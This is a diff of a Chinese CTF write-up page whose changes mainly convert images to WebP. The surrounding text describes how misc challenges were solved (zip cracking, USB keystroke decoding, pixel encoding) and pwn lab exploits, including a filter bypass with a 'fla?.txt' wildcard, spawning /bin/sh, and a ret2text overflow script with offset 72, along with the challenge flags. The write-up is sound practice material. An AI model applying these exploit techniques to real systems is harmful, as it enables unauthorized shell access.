@@ -134,8 +134,6 @@
     
       <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css">
     
-      <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
-    
       <link rel="stylesheet" href="../../../css/tasklist.css">
     
       <link rel="stylesheet" href="../../../css/custom.css">
@@ -191,7 +189,7 @@
   <nav class="md-header__inner md-grid" aria-label="页眉">
     <a href="../../.." title="时度度的笔记本" class="md-header__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
       
-  <img src="/assets/logo-Hymmn0s.png" alt="logo">
+  <img src="/assets/logo-Hymmn0s.png.webp" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -481,7 +479,7 @@
   <label class="md-nav__title" for="__drawer">
     <a href="../../.." title="时度度的笔记本" class="md-nav__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
       
-  <img src="/assets/logo-Hymmn0s.png" alt="logo">
+  <img src="/assets/logo-Hymmn0s.png.webp" alt="logo">
 
     </a>
     时度度的笔记本
@@ -3615,14 +3613,14 @@
 <p>666C61677B546869735F69355F763372795F336173792121217D</p>
 </blockquote>
 <p>再一眼<strong>base16</strong>,还是一样的做法得到:</p>
-<p><img alt="" src="../../../assets/sign_in.png" /></p>
+<p><img alt="" src="../../../assets/sign_in.png.webp" loading="eager" decoding="async" width="409" height="54"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{This_i5_v3ry_3asy!!!}</p>
 </blockquote>
 <h3 id="fences_of_light">fences_of_light<a class="headerlink" href="#fences_of_light" title="Permanent link">&para;</a></h3>
 <p>给了一张图</p>
-<p><img alt="" src="../../../assets/fences_of_light.png" /></p>
+<p><img alt="" src="../../../assets/fences_of_light.png.webp" loading="lazy" decoding="async" width="800" height="400"></p>
 <p>没什么好说的，纯看眼力，这段文本内容为：</p>
 <blockquote>
 <p>Welcome to 赣CTF </p>
@@ -3637,23 +3635,23 @@
 </blockquote>
 <h3 id="base64">base64<a class="headerlink" href="#base64" title="Permanent link">&para;</a></h3>
 <p>给了一个exe文件，但打不开，尝试使用记事本打开，有若干段base64，有趣的是直接对base64解码，可以发现都是J-POP的歌曲，但重点不在这里。</p>
-<p><img alt="base64-question" src="../../../assets/base64-question.png" /></p>
+<p><img alt="base64-question" src="../../../assets/base64-question.png.webp" loading="lazy" decoding="async" width="1891" height="939"></p>
 <p>可以查到这是个base64隐写,在网上随意找了个脚本运行,返回了</p>
 <blockquote>
 <p>666C61677B555F6172335F7265406C5F6261733372217D</p>
 </blockquote>
 <p>还是<strong>base16</strong>,</p>
-<p><img alt="base64" src="../../../assets/base64.png" /></p>
+<p><img alt="base64" src="../../../assets/base64.png.webp" loading="lazy" decoding="async" width="527" height="37"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{U_ar3_re@l_bas3r!}</p>
 </blockquote>
 <h3 id="ez_zip1">ez_zip1<a class="headerlink" href="#ez_zip1" title="Permanent link">&para;</a></h3>
 <p>给了个压缩包，打开<strong>010editor</strong>查看</p>
-<p><img alt="ez_zip1" src="../../../assets/ez_zip1-1.png" /></p>
-<p>可以看到两个加密标记位都是奇数，但改成00后，发现是伪加密。提取文件，其中还有一个压缩包"flag.zip"，还是先查看伪加密，发现不是尝试爆破，爆破成功。<img alt="ez_zip1-2" src="../../../assets/ez_zip1-2.png" /></p>
+<p><img alt="ez_zip1" src="../../../assets/ez_zip1-1.png.webp" loading="lazy" decoding="async" width="1142" height="695"></p>
+<p>可以看到两个加密标记位都是奇数，但改成00后，发现是伪加密。提取文件，其中还有一个压缩包"flag.zip"，还是先查看伪加密，发现不是尝试爆破，爆破成功。<img alt="ez_zip1-2" src="../../../assets/ez_zip1-2.png.webp" loading="lazy" decoding="async" width="1191" height="605"></p>
 <p>将密码<strong>0913</strong>填入，解压查看<strong>flag.txt</strong></p>
-<p><img alt="ez_zip-flag" src="../../../assets/ez_zip1-flag.png" /></p>
+<p><img alt="ez_zip-flag" src="../../../assets/ez_zip1-flag.png.webp" loading="lazy" decoding="async" width="575" height="44"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{41e8dd8f-389a-fa59-2a4b-e6b4844b1019}</p>
@@ -3664,28 +3662,28 @@
 <p>847ADE91 8F10EFFB D7B86FBA EC1F5853 A8C830AD CB3F5C31</p>
 </blockquote>
 <p>爆破！</p>
-<p><img alt="ez_zip2-1" src="../../../assets/ez_zip2-1.png" /></p>
+<p><img alt="ez_zip2-1" src="../../../assets/ez_zip2-1.png.webp" loading="lazy" decoding="async" width="831" height="592"></p>
 <p>如图，重复6次得到：</p>
 <blockquote>
 <p>9c1f88742f1023937171f0e2</p>
 </blockquote>
 <p>解压，还有一层<strong>flag.zip</strong>，卡了我几天，后面终于找到<strong>bkcrack</strong>爆破。由于bkcrack爆破需要知道内容至少<strong>12</strong>字节的内容，可知zip内部为<strong>flag.png</strong>。打开010editor构造文件头，如下：</p>
-<p><img alt="ez_zip2-2" src="../../../assets/ez_zip2-2.png" /></p>
+<p><img alt="ez_zip2-2" src="../../../assets/ez_zip2-2.png.webp" loading="lazy" decoding="async" width="1075" height="103"></p>
 <p>再爆破出key，</p>
 <blockquote>
 <p>fcdf3458 84e54077 d0ca60b6</p>
 </blockquote>
 <p>但这个key并不是真正的key，我们得用这个key构建一个与原压缩包内容相同的新压缩包，但密码由自己设定：</p>
-<p><img alt="ez_zip2-3" src="../../../assets/ez_zip2-3.png" /></p>
+<p><img alt="ez_zip2-3" src="../../../assets/ez_zip2-3.png.webp" loading="lazy" decoding="async" width="1702" height="198"></p>
 <p>在这里我设成了ez，最后解压打开<strong>flag.png</strong>.</p>
-<p><img alt="ez_zip2-flag" src="../../../assets/ez_zip2-flag.png" /></p>
+<p><img alt="ez_zip2-flag" src="../../../assets/ez_zip2-flag.png.webp" loading="lazy" decoding="async" width="349" height="23"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{b7b043ed-3f27-325c-013a-da17f5b23a17}</p>
 </blockquote>
 <h3 id="ez_usb">ez_usb<a class="headerlink" href="#ez_usb" title="Permanent link">&para;</a></h3>
 <p>打开压缩包，存有一个<strong>pcapng</strong>文件，用<strong>wireshark</strong>打开,发现其中都为<strong>HID Data</strong></p>
-<p><img alt="ez_usb-1" src="../../../assets/ez_usb-1.png" /></p>
+<p><img alt="ez_usb-1" src="../../../assets/ez_usb-1.png.webp" loading="lazy" decoding="async" width="1820" height="431"></p>
 <p>再用<strong>wireshark</strong>提取数据，存为<strong>usbdata.txt</strong>,编写脚本解码敲击码</p>
 <div class="language-py highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">normalKeys</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"04"</span><span class="p">:</span><span class="s2">"a"</span><span class="p">,</span> <span class="s2">"05"</span><span class="p">:</span><span class="s2">"b"</span><span class="p">,</span> <span class="s2">"06"</span><span class="p">:</span><span class="s2">"c"</span><span class="p">,</span> <span class="s2">"07"</span><span class="p">:</span><span class="s2">"d"</span><span class="p">,</span> <span class="s2">"08"</span><span class="p">:</span><span class="s2">"e"</span><span class="p">,</span> <span class="s2">"09"</span><span class="p">:</span><span class="s2">"f"</span><span class="p">,</span> <span class="s2">"0a"</span><span class="p">:</span><span class="s2">"g"</span><span class="p">,</span> <span class="s2">"0b"</span><span class="p">:</span><span class="s2">"h"</span><span class="p">,</span> <span class="s2">"0c"</span><span class="p">:</span><span class="s2">"i"</span><span class="p">,</span> <span class="s2">"0d"</span><span class="p">:</span><span class="s2">"j"</span><span class="p">,</span> <span class="s2">"0e"</span><span class="p">:</span><span class="s2">"k"</span><span class="p">,</span> <span class="s2">"0f"</span><span class="p">:</span><span class="s2">"l"</span><span class="p">,</span> <span class="s2">"10"</span><span class="p">:</span><span class="s2">"m"</span><span class="p">,</span> <span class="s2">"11"</span><span class="p">:</span><span class="s2">"n"</span><span class="p">,</span> <span class="s2">"12"</span><span class="p">:</span><span class="s2">"o"</span><span class="p">,</span> <span class="s2">"13"</span><span class="p">:</span><span class="s2">"p"</span><span class="p">,</span> <span class="s2">"14"</span><span class="p">:</span><span class="s2">"q"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">:</span><span class="s2">"r"</span><span class="p">,</span> <span class="s2">"16"</span><span class="p">:</span><span class="s2">"s"</span><span class="p">,</span> <span class="s2">"17"</span><span class="p">:</span><span class="s2">"t"</span><span class="p">,</span> <span class="s2">"18"</span><span class="p">:</span><span class="s2">"u"</span><span class="p">,</span> <span class="s2">"19"</span><span class="p">:</span><span class="s2">"v"</span><span class="p">,</span> <span class="s2">"1a"</span><span class="p">:</span><span class="s2">"w"</span><span class="p">,</span> <span class="s2">"1b"</span><span class="p">:</span><span class="s2">"x"</span><span class="p">,</span> <span class="s2">"1c"</span><span class="p">:</span><span class="s2">"y"</span><span class="p">,</span> <span class="s2">"1d"</span><span class="p">:</span><span class="s2">"z"</span><span class="p">,</span><span class="s2">"1e"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span> <span class="s2">"1f"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span> <span class="s2">"20"</span><span class="p">:</span><span class="s2">"3"</span><span class="p">,</span> <span class="s2">"21"</span><span class="p">:</span><span class="s2">"4"</span><span class="p">,</span> <span class="s2">"22"</span><span class="p">:</span><span class="s2">"5"</span><span class="p">,</span> <span class="s2">"23"</span><span class="p">:</span><span class="s2">"6"</span><span class="p">,</span><span class="s2">"24"</span><span class="p">:</span><span class="s2">"7"</span><span class="p">,</span><span class="s2">"25"</span><span class="p">:</span><span class="s2">"8"</span><span class="p">,</span><span class="s2">"26"</span><span class="p">:</span><span class="s2">"9"</span><span class="p">,</span><span class="s2">"27"</span><span class="p">:</span><span class="s2">"0"</span><span class="p">,</span><span class="s2">"28"</span><span class="p">:</span><span class="s2">"&lt;RET&gt;"</span><span class="p">,</span><span class="s2">"29"</span><span class="p">:</span><span class="s2">"&lt;ESC&gt;"</span><span class="p">,</span><span class="s2">"2a"</span><span class="p">:</span><span class="s2">"&lt;DEL&gt;"</span><span class="p">,</span> <span class="s2">"2b"</span><span class="p">:</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span><span class="s2">"2c"</span><span class="p">:</span><span class="s2">"&lt;SPACE&gt;"</span><span class="p">,</span><span class="s2">"2d"</span><span class="p">:</span><span class="s2">"-"</span><span class="p">,</span><span class="s2">"2e"</span><span class="p">:</span><span class="s2">"="</span><span class="p">,</span><span class="s2">"2f"</span><span class="p">:</span><span class="s2">"["</span><span class="p">,</span><span class="s2">"30"</span><span class="p">:</span><span class="s2">"]"</span><span class="p">,</span><span class="s2">"31"</span><span class="p">:</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span><span class="s2">"32"</span><span class="p">:</span><span class="s2">"&lt;NON&gt;"</span><span class="p">,</span><span class="s2">"33"</span><span class="p">:</span><span class="s2">";"</span><span class="p">,</span><span class="s2">"34"</span><span class="p">:</span><span class="s2">"'"</span><span class="p">,</span><span class="s2">"35"</span><span class="p">:</span><span class="s2">"&lt;GA&gt;"</span><span class="p">,</span><span class="s2">"36"</span><span class="p">:</span><span class="s2">","</span><span class="p">,</span><span class="s2">"37"</span><span class="p">:</span><span class="s2">"."</span><span class="p">,</span><span class="s2">"38"</span><span class="p">:</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">"39"</span><span class="p">:</span><span class="s2">"&lt;CAP&gt;"</span><span class="p">,</span><span class="s2">"3a"</span><span class="p">:</span><span class="s2">"&lt;F1&gt;"</span><span class="p">,</span><span class="s2">"3b"</span><span class="p">:</span><span class="s2">"&lt;F2&gt;"</span><span class="p">,</span> <span class="s2">"3c"</span><span class="p">:</span><span class="s2">"&lt;F3&gt;"</span><span class="p">,</span><span class="s2">"3d"</span><span class="p">:</span><span class="s2">"&lt;F4&gt;"</span><span class="p">,</span><span class="s2">"3e"</span><span class="p">:</span><span class="s2">"&lt;F5&gt;"</span><span class="p">,</span><span class="s2">"3f"</span><span class="p">:</span><span class="s2">"&lt;F6&gt;"</span><span class="p">,</span><span class="s2">"40"</span><span class="p">:</span><span class="s2">"&lt;F7&gt;"</span><span class="p">,</span><span class="s2">"41"</span><span class="p">:</span><span class="s2">"&lt;F8&gt;"</span><span class="p">,</span><span class="s2">"42"</span><span class="p">:</span><span class="s2">"&lt;F9&gt;"</span><span class="p">,</span><span class="s2">"43"</span><span class="p">:</span><span class="s2">"&lt;F10&gt;"</span><span class="p">,</span><span class="s2">"44"</span><span class="p">:</span><span class="s2">"&lt;F11&gt;"</span><span class="p">,</span><span class="s2">"45"</span><span class="p">:</span><span class="s2">"&lt;F12&gt;"</span><span class="p">}</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">shiftKeys</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"04"</span><span class="p">:</span><span class="s2">"A"</span><span class="p">,</span> <span class="s2">"05"</span><span class="p">:</span><span class="s2">"B"</span><span class="p">,</span> <span class="s2">"06"</span><span class="p">:</span><span class="s2">"C"</span><span class="p">,</span> <span class="s2">"07"</span><span class="p">:</span><span class="s2">"D"</span><span class="p">,</span> <span class="s2">"08"</span><span class="p">:</span><span class="s2">"E"</span><span class="p">,</span> <span class="s2">"09"</span><span class="p">:</span><span class="s2">"F"</span><span class="p">,</span> <span class="s2">"0a"</span><span class="p">:</span><span class="s2">"G"</span><span class="p">,</span> <span class="s2">"0b"</span><span class="p">:</span><span class="s2">"H"</span><span class="p">,</span> <span class="s2">"0c"</span><span class="p">:</span><span class="s2">"I"</span><span class="p">,</span> <span class="s2">"0d"</span><span class="p">:</span><span class="s2">"J"</span><span class="p">,</span> <span class="s2">"0e"</span><span class="p">:</span><span class="s2">"K"</span><span class="p">,</span> <span class="s2">"0f"</span><span class="p">:</span><span class="s2">"L"</span><span class="p">,</span> <span class="s2">"10"</span><span class="p">:</span><span class="s2">"M"</span><span class="p">,</span> <span class="s2">"11"</span><span class="p">:</span><span class="s2">"N"</span><span class="p">,</span> <span class="s2">"12"</span><span class="p">:</span><span class="s2">"O"</span><span class="p">,</span> <span class="s2">"13"</span><span class="p">:</span><span class="s2">"P"</span><span class="p">,</span> <span class="s2">"14"</span><span class="p">:</span><span class="s2">"Q"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">:</span><span class="s2">"R"</span><span class="p">,</span> <span class="s2">"16"</span><span class="p">:</span><span class="s2">"S"</span><span class="p">,</span> <span class="s2">"17"</span><span class="p">:</span><span class="s2">"T"</span><span class="p">,</span> <span class="s2">"18"</span><span class="p">:</span><span class="s2">"U"</span><span class="p">,</span> <span class="s2">"19"</span><span class="p">:</span><span class="s2">"V"</span><span class="p">,</span> <span class="s2">"1a"</span><span class="p">:</span><span class="s2">"W"</span><span class="p">,</span> <span class="s2">"1b"</span><span class="p">:</span><span class="s2">"X"</span><span class="p">,</span> <span class="s2">"1c"</span><span class="p">:</span><span class="s2">"Y"</span><span class="p">,</span> <span class="s2">"1d"</span><span class="p">:</span><span class="s2">"Z"</span><span class="p">,</span><span class="s2">"1e"</span><span class="p">:</span><span class="s2">"!"</span><span class="p">,</span> <span class="s2">"1f"</span><span class="p">:</span><span class="s2">"@"</span><span class="p">,</span> <span class="s2">"20"</span><span class="p">:</span><span class="s2">"#"</span><span class="p">,</span> <span class="s2">"21"</span><span class="p">:</span><span class="s2">"$"</span><span class="p">,</span> <span class="s2">"22"</span><span class="p">:</span><span class="s2">"%"</span><span class="p">,</span> <span class="s2">"23"</span><span class="p">:</span><span class="s2">"^"</span><span class="p">,</span><span class="s2">"24"</span><span class="p">:</span><span class="s2">"&amp;"</span><span class="p">,</span><span class="s2">"25"</span><span class="p">:</span><span class="s2">"*"</span><span class="p">,</span><span class="s2">"26"</span><span class="p">:</span><span class="s2">"("</span><span class="p">,</span><span class="s2">"27"</span><span class="p">:</span><span class="s2">")"</span><span class="p">,</span><span class="s2">"28"</span><span class="p">:</span><span class="s2">"&lt;RET&gt;"</span><span class="p">,</span><span class="s2">"29"</span><span class="p">:</span><span class="s2">"&lt;ESC&gt;"</span><span class="p">,</span><span class="s2">"2a"</span><span class="p">:</span><span class="s2">"&lt;DEL&gt;"</span><span class="p">,</span> <span class="s2">"2b"</span><span class="p">:</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span><span class="s2">"2c"</span><span class="p">:</span><span class="s2">"&lt;SPACE&gt;"</span><span class="p">,</span><span class="s2">"2d"</span><span class="p">:</span><span class="s2">"_"</span><span class="p">,</span><span class="s2">"2e"</span><span class="p">:</span><span class="s2">"+"</span><span class="p">,</span><span class="s2">"2f"</span><span class="p">:</span><span class="s2">"{"</span><span class="p">,</span><span class="s2">"30"</span><span class="p">:</span><span class="s2">"}"</span><span class="p">,</span><span class="s2">"31"</span><span class="p">:</span><span class="s2">"|"</span><span class="p">,</span><span class="s2">"32"</span><span class="p">:</span><span class="s2">"&lt;NON&gt;"</span><span class="p">,</span><span class="s2">"33"</span><span class="p">:</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="s2">"34"</span><span class="p">:</span><span class="s2">":"</span><span class="p">,</span><span class="s2">"35"</span><span class="p">:</span><span class="s2">"&lt;GA&gt;"</span><span class="p">,</span><span class="s2">"36"</span><span class="p">:</span><span class="s2">"&lt;"</span><span class="p">,</span><span class="s2">"37"</span><span class="p">:</span><span class="s2">"&gt;"</span><span class="p">,</span><span class="s2">"38"</span><span class="p">:</span><span class="s2">"?"</span><span class="p">,</span><span class="s2">"39"</span><span class="p">:</span><span class="s2">"&lt;CAP&gt;"</span><span class="p">,</span><span class="s2">"3a"</span><span class="p">:</span><span class="s2">"&lt;F1&gt;"</span><span class="p">,</span><span class="s2">"3b"</span><span class="p">:</span><span class="s2">"&lt;F2&gt;"</span><span class="p">,</span> <span class="s2">"3c"</span><span class="p">:</span><span class="s2">"&lt;F3&gt;"</span><span class="p">,</span><span class="s2">"3d"</span><span class="p">:</span><span class="s2">"&lt;F4&gt;"</span><span class="p">,</span><span class="s2">"3e"</span><span class="p">:</span><span class="s2">"&lt;F5&gt;"</span><span class="p">,</span><span class="s2">"3f"</span><span class="p">:</span><span class="s2">"&lt;F6&gt;"</span><span class="p">,</span><span class="s2">"40"</span><span class="p">:</span><span class="s2">"&lt;F7&gt;"</span><span class="p">,</span><span class="s2">"41"</span><span class="p">:</span><span class="s2">"&lt;F8&gt;"</span><span class="p">,</span><span class="s2">"42"</span><span class="p">:</span><span class="s2">"&lt;F9&gt;"</span><span class="p">,</span><span class="s2">"43"</span><span class="p">:</span><span class="s2">"&lt;F10&gt;"</span><span class="p">,</span><span class="s2">"44"</span><span class="p">:</span><span class="s2">"&lt;F11&gt;"</span><span class="p">,</span><span class="s2">"45"</span><span class="p">:</span><span class="s2">"&lt;F12&gt;"</span><span class="p">}</span>
@@ -3700,7 +3698,7 @@
 </span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></code></pre></div>
 <p>得到：</p>
-<p><img alt="ez_usb-2" src="../../../assets/ez_usb-2.png" /></p>
+<p><img alt="ez_usb-2" src="../../../assets/ez_usb-2.png.webp" loading="lazy" decoding="async" width="1954" height="55"></p>
 <p>flag:</p>
 <blockquote>
 <p><em>flag{d16bd8ee-515d-207f-97c1-b4f80563db53}</em></p>
@@ -3715,19 +3713,19 @@
 <li>射箭试炼</li>
 </ul>
 <p>每个闯关有一部分flag，说是不能作弊实际只是不能开创造模式，所以过关方法很多。</p>
-<p><img alt="ez_mc-flag1" src="../../../assets/ez_mc-flag1.png" /></p>
-<p><img alt="ez_mc-flag2" src="../../../assets/ez_mc-flag2.png" /></p>
-<p><img alt="ez_mc-flag3" src="../../../assets/ez_mc-flag3.png" /></p>
-<p><img alt="ez_mc-flag4" src="../../../assets/ez_mc-flag4.png" /></p>
+<p><img alt="ez_mc-flag1" src="../../../assets/ez_mc-flag1.png.webp" loading="lazy" decoding="async" width="261" height="73"></p>
+<p><img alt="ez_mc-flag2" src="../../../assets/ez_mc-flag2.png.webp" loading="lazy" decoding="async" width="321" height="90"></p>
+<p><img alt="ez_mc-flag3" src="../../../assets/ez_mc-flag3.png.webp" loading="lazy" decoding="async" width="266" height="72"></p>
+<p><img alt="ez_mc-flag4" src="../../../assets/ez_mc-flag4.png.webp" loading="lazy" decoding="async" width="219" height="70"></p>
 <p>flag：</p>
 <blockquote>
 <p>flag{a6525897-c720-2899-895b-627c9d75fe82}</p>
 </blockquote>
 <h3 id="_1">找呀找呀找朋友<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
-<p><img alt="photo" src="../../../assets/photo.jpg" /></p>
+<p><img alt="photo" src="../../../assets/photo.jpg" loading="lazy" decoding="async" width="1080" height="1920"></p>
 <p>社工题，给了张图，查询其中<strong>声临阿加莎</strong>可以发现是一个剧目，在上海市的茉莉花剧院，打开<strong>大麦app</strong>，查看场照和座位表：</p>
-<p><img alt="friend-1" src="../../../assets/friend-1.jpg" /></p>
-<p><img alt="friend-2" src="../../../assets/friend-2.jpg" /></p>
+<p><img alt="friend-1" src="../../../assets/friend-1.jpg" loading="lazy" decoding="async" width="1179" height="786"></p>
+<p><img alt="friend-2" src="../../../assets/friend-2.jpg" loading="lazy" decoding="async" width="864" height="1920"></p>
 <p>结合flag格式可解</p>
 <blockquote>
 <p>flag{某某市_某某路_某某_总第某排_当前区域第某排}</p>
@@ -3738,13 +3736,13 @@
 </blockquote>
 <h3 id="pixel_game">pixel_game<a class="headerlink" href="#pixel_game" title="Permanent link">&para;</a></h3>
 <p>给了一张图片和一段描述</p>
-<p><img alt="pixel_game" src="../../../assets/pixel_game.png" /></p>
+<p><img alt="pixel_game" src="../../../assets/pixel_game.png.webp" loading="lazy" decoding="async" width="127" height="87"></p>
 <blockquote>
 <p>好怪,在一堆像素里面能放进什么信息呢?</p>
 <p>提示:像素是由什么组成的来着?</p>
 </blockquote>
 <p>说与像素有关,用python的<strong>PIL</strong>写了个脚本查看像素RGB值，发现</p>
-<p><img alt="pixel_game-1" src="../../../assets/pixel_game-1.png" /></p>
+<p><img alt="pixel_game-1" src="../../../assets/pixel_game-1.png.webp" loading="lazy" decoding="async" width="171" height="988"></p>
 <p>RGB中除0外只存在<strong>33 40 41 43 91 93</strong>六个数字，当作ascii码,即为<strong>+ ( ) [ ] !</strong>这几个字符,推断为<strong>jjcode</strong>,编写脚本</p>
 <div class="language-py highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
@@ -3762,9 +3760,9 @@
 </span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>        <span class="k">if</span> <span class="n">j</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s1">''</span><span class="p">)</span>
 </span></code></pre></div>
 <p>得到</p>
-<p><img alt="pixel_game-res" src="../../../assets/pixel_game-res.png" /></p>
+<p><img alt="pixel_game-res" src="../../../assets/pixel_game-res.png.webp" loading="lazy" decoding="async" width="1960" height="627"></p>
 <p>放入浏览器控制台，可解出</p>
-<p><img alt="pixel_game-flag" src="../../../assets/pixel_game-flag.png" /></p>
+<p><img alt="pixel_game-flag" src="../../../assets/pixel_game-flag.png.webp" loading="lazy" decoding="async" width="293" height="48"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{Plx3l_1s_fun!!!}</p>
@@ -3918,14 +3916,14 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 <h2 id="pwn">Pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
 <h3 id="testnc">testnc<a class="headerlink" href="#testnc" title="Permanent link">&para;</a></h3>
 <p>如标题，工具测试题，使用<strong>nc</strong>连接靶机读取flag即可</p>
-<p><img alt="testnc-flag" src="../../../assets/testnc-flag.png" /></p>
+<p><img alt="testnc-flag" src="../../../assets/testnc-flag.png.webp" loading="lazy" decoding="async" width="646" height="355"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{03d6d02c-2a70-4d72-9750-1e4d86c25880}</p>
 </blockquote>
 <h3 id="what_is_tac">what_is_tac<a class="headerlink" href="#what_is_tac" title="Permanent link">&para;</a></h3>
 <p>和上题差不多，只不过多了对<strong>flag</strong>的字符检测，我们使用<strong>fla?.txt</strong>绕过，并使用标题中的<strong>tac</strong>指令即可</p>
-<p><img alt="what_is_tac-flag" src="../../../assets/what_is_tac-flag.png" /></p>
+<p><img alt="what_is_tac-flag" src="../../../assets/what_is_tac-flag.png.webp" loading="lazy" decoding="async" width="624" height="381"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{add0045a-8771-4a75-8e32-195b64a41723}</p>
@@ -3953,36 +3951,36 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 </span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></code></pre></div>
 <p>结果如下</p>
-<p><img alt="calc-flag" src="../../../assets/calc-flag.png" /></p>
+<p><img alt="calc-flag" src="../../../assets/calc-flag.png.webp" loading="lazy" decoding="async" width="565" height="458"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{260d6273-f086-49bc-8a95-ef5af4ac6b23}</p>
 </blockquote>
 <h3 id="_3">负数?<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <p>如标题，连接靶机，输入负数即可。</p>
-<p><img alt="negtive-flag" src="../../../assets/negtive-flag.png" /></p>
+<p><img alt="negtive-flag" src="../../../assets/negtive-flag.png.webp" loading="lazy" decoding="async" width="800" height="532"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{1a9ebd98-bfb0-4d30-a4bf-227e80a68b5d}</p>
 </blockquote>
 <h3 id="game">game<a class="headerlink" href="#game" title="Permanent link">&para;</a></h3>
 <p>连接靶机，选择难度开始游戏</p>
-<p><img alt="game-1" src="../../../assets/game-1.png" /></p>
+<p><img alt="game-1" src="../../../assets/game-1.png.webp" loading="lazy" decoding="async" width="1341" height="538"></p>
 <p>通关后却啥也没有，于是我们使用IDA查看程序文件,发现<strong>pwngame</strong>函数中有<strong>system("/bin/sh")</strong>,我们的任务便是触发这个函数，又在<strong>Menu</strong>中发现输入<strong>996</strong>时会调用<strong>pwngame</strong></p>
-<p><img alt="game-pwngame" src="../../../assets/game-pwngame.png" /></p>
-<p><img alt="game-menu" src="../../../assets/game-Menu.png" /></p>
+<p><img alt="game-pwngame" src="../../../assets/game-pwngame.png.webp" loading="lazy" decoding="async" width="353" height="121"></p>
+<p><img alt="game-menu" src="../../../assets/game-Menu.png.webp" loading="lazy" decoding="async" width="296" height="117"></p>
 <p>所以我们连接靶机，执行操作</p>
-<p><img alt="game-flag" src="../../../assets/game-flag.png" /></p>
+<p><img alt="game-flag" src="../../../assets/game-flag.png.webp" loading="lazy" decoding="async" width="775" height="504"></p>
 <p>flag:</p>
 <blockquote>
 <p>flag{ac6f04d2-384d-4eef-9fee-7f24e6d10a11}</p>
 </blockquote>
 <h3 id="ret2text">ret2text<a class="headerlink" href="#ret2text" title="Permanent link">&para;</a></h3>
 <p>栈溢出题，先checksec一下,发现<strong>NX</strong>开启</p>
-<p><img alt="" src="../../../assets/ret2text-checksec.png" /></p>
+<p><img alt="" src="../../../assets/ret2text-checksec.png.webp" loading="lazy" decoding="async" width="664" height="154"></p>
 <p>然后观察IDA，发现<strong>backdoor</strong>函数中含有<strong>system("/bin/sh")</strong>，以及<strong>vuln</strong>函数通过gets读取数据，长度为<strong>64</strong>字节，64位程序，所以偏移位为<strong>64+8=72</strong></p>
-<p><img alt="ret2text-backdoor" src="../../../assets/ret2text-backdoor.png" /></p>
-<p><img alt="ret2text-vuln" src="../../../assets/ret2text-vuln.png" /></p>
+<p><img alt="ret2text-backdoor" src="../../../assets/ret2text-backdoor.png.webp" loading="lazy" decoding="async" width="1166" height="287"></p>
+<p><img alt="ret2text-vuln" src="../../../assets/ret2text-vuln.png.webp" loading="lazy" decoding="async" width="489" height="171"></p>
 <p>编写脚本</p>
 <div class="language-py highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
@@ -3995,7 +3993,7 @@ enc_{n-1} &amp;=&amp; flag_{n-1}\oplus flag_1\oplus key_{n \mathrm{mod}4}
 </span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></code></pre></div>
 <p>运行结果如下</p>
